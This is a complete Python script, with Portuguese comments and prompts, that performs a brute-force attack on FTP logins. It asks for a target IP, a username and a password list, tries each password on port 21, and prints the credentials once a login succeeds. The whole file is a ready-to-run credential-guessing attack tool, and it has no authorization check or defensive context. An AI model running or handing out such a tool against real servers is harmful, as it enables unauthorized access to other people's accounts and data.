#!/usr/bin/env python3
# FTP BruteForce

import ftplib
from colorama import init, Fore, Style

init(autoreset=True)

def tentar_ftp(ip, usuario, senha):
    ftp = ftplib.FTP()

    try:
        ftp.connect(ip, 21, timeout=5)
        ftp.login(usuario, senha)
        print(Fore.GREEN + f"[+] SUCESSO: {usuario}:{senha}")
        ftp.quit()
        return True
    except ftplib.all_errors as e:
        print(Fore.RED + f"[-] Falha: {usuario}:{senha}")
    except Exception as e:
        print(Fore.RED + f"[!] Erro desconhecido: {e}")
    return False

def brute_force_ftp(ip, usuario, arquivo_senhas):
    print(Fore.CYAN + f"Iniciando força bruta FTP em {ip} com o usuário '{usuario}'...")

    try:
        with open(arquivo_senhas, "r", encoding="utf-8") as f:
            senhas = [linha.strip() for linha in f if linha.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"Arquivo '{arquivo_senhas}' não encontrado.")
        return

    for senha in senhas:
        if tentar_ftp(ip, usuario, senha):
            print(Fore.GREEN + f"\n[+] Credencial encontrada: {usuario}:{senha}")
            return
    print(Fore.YELLOW + "\n[-] Nenhuma senha funcionou.")

if __name__ == "__main__":
    print(Fore.CYAN + Style.BRIGHT + "=== Ataque de Força Bruta FTP ===\n")
    ip = input("IP do alvo: ").strip()
    usuario = input("Usuário: ").strip()
    arquivo_senhas = input("Arquivo de senhas (ex: senhas.txt): ").strip()

    brute_force_ftp(ip, usuario, arquivo_senhas)
